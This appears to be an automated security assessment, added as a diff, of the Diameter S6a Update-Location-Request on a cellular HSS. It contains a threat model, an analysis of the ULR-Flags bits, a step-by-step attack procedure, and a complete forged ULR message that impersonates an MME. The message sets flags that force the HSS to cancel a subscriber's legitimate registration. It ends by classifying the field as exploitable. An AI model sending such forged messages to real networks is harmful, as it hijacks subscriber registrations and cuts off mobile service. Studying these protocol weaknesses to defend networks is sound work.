@@ -1,0 +1,110 @@
+**Threat Model:**
+- **Attack Assumption:** A publicly reachable HSS exposes S6a and accepts Diameter `Update-Location-Request` messages from an unauthenticated peer. The attacker impersonates an MME and sends a forged ULR for a known subscriber IMSI. The HSS processes `ULR-Flags` in that request as authoritative S6a procedure input.
+- **Attacker Capability:** The attacker can establish its own Diameter connection to the HSS, send crafted ULRs, and receive ULAs on that same connection. The attacker cannot observe or interfere with traffic between the legitimate MME/SGSN and HSS, and is not itself a real serving node in the operator network.
+
+**Exploitability Analysis:**
+`ULR-Flags` is a top-level mandatory `Unsigned32` bitmask AVP in the S6a `Update-Location-Request`. It is processed directly by the HSS during update-location handling. Although many consequences of a forged ULR come from the procedure as a whole, `ULR-Flags` does add field-specific exploitable behavior for certain bits, especially bit 0 (`Single-Registration-Indication`) and bit 5 (`Initial-Attach-Indicator`).
+
+The strongest field-specific effect is cancellation control:
+
+- If **bit 0** is set, the HSS shall send `Cancel-Location` to any registered SGSN and delete stored SGSN address/number.
+- If **bit 5** is set, the HSS shall send `Cancel-Location` to the previously registered MME or SGSN for initial-attach handling.
+
+That is a distinct effect attributable to the flag value itself, not merely to sending a forged ULR. A forged ULR already lets the attacker replace the stored serving MME identity via `Origin-Host`, but the cancel behavior toward prior registrations is specifically gated by `ULR-Flags`. By setting the cancellation-triggering bits, the attacker can force the HSS to drive cleanup of old mobility state, causing the old MME/SGSN to remove UE context and potentially release bearer resources and trigger S-GW session deletion. This yields a concrete denial-of-service path for the subscriber until legitimate mobility signaling restores context.
+
+Other bits have weaker but still field-specific response-shaping semantics:
+
+- **bit 2** can cause the HSS to omit `Subscription-Data` in the current ULA, but this is procedural and transient.
+- **bit 3** controls inclusion of `GPRS-Subscription-Data` in returned `Subscription-Data`.
+- **bit 4** influences combined-node versus standalone-node handling and related download/check behavior.
+
+However, the clearest security-relevant exploit chain is through **bit 5** and optionally **bit 0**, because those bits normatively change HSS-triggered cancellation behavior and can propagate into context deletion and bearer teardown in other nodes. The resulting impact is per-subscriber, semi-persistent registration disruption until overwritten by a later legitimate ULR, attach, TAU, detach, or purge flow.
+
+This is therefore not merely generic "forged ULR abuse." The additional harmful effect-forced cancellation of prior serving-node state-is specifically controlled by `ULR-Flags`.
+
+**Attack Procedure:**
+Send a minimally coherent forged S6a `Update-Location-Request` to the HSS, including only mandatory AVPs and coherence-related routing/application AVPs. Set the target field `ULR-Flags` to a malicious test value that remains protocol-plausible on S6a.
+
+For an S6a attack, set:
+- **bit 1** (`S6a/S6d-Indicator`) = 1, to stay consistent with an MME-originated S6a ULR.
+- **bit 5** (`Initial-Attach-Indicator`) = 1, to request HSS cancellation of the previously registered MME/SGSN.
+
+A clear test value is therefore **34 decimal** (`0x22` = bit1 + bit5).
+
+Use a real subscriber IMSI in `User-Name`, a plausible LTE `RAT-Type`, and a realistic `Visited-PLMN-Id`. `Origin-Host` should be the attacker-controlled fake MME identity because HSS stores that as the new MME identity when accepting the ULR.
+
+Expected success condition:
+1. HSS accepts the ULR and returns a ULA.
+2. HSS updates the subscriber's serving MME registration to the attacker-chosen `Origin-Host`.
+3. Because of `ULR-Flags.bit5`, HSS sends `Cancel-Location` to the previously registered MME/SGSN.
+4. The old serving node removes UE context and may release session/bearer state, producing observable subscriber service disruption.
+
+**Attack Message:**
+```json
+{
+  "diameter_header": {
+    "command_code": 316,
+    "application_id": 16777251,
+    "request": true,
+    "proxiable": true
+  },
+  "avps": [
+    {
+      "avp_name": "Session-Id",
+      "avp_value": "attacker.mme.example.net;1710000000;1"
+    },
+    {
+      "avp_name": "Vendor-Specific-Application-Id",
+      "grouped_avp": [
+        {
+          "avp_name": "Vendor-Id",
+          "avp_value": 10415
+        },
+        {
+          "avp_name": "Auth-Application-Id",
+          "avp_value": 16777251
+        }
+      ]
+    },
+    {
+      "avp_name": "Auth-Session-State",
+      "avp_value": 1
+    },
+    {
+      "avp_name": "Origin-Host",
+      "avp_value": "mme-attacker.example.net"
+    },
+    {
+      "avp_name": "Origin-Realm",
+      "avp_value": "example.net"
+    },
+    {
+      "avp_name": "Destination-Realm",
+      "avp_value": "operator.example"
+    },
+    {
+      "avp_name": "Destination-Host",
+      "avp_value": "hss01.operator.example"
+    },
+    {
+      "avp_name": "User-Name",
+      "avp_value": "001010123456789"
+    },
+    {
+      "avp_name": "RAT-Type",
+      "avp_value": "EUTRAN"
+    },
+    {
+      "avp_name": "ULR-Flags",
+      "avp_value": 34
+    },
+    {
+      "avp_name": "Visited-PLMN-Id",
+      "avp_value": "00101"
+    }
+  ]
+}
+```
+
+**Classification:**
+EXPLOITABLE
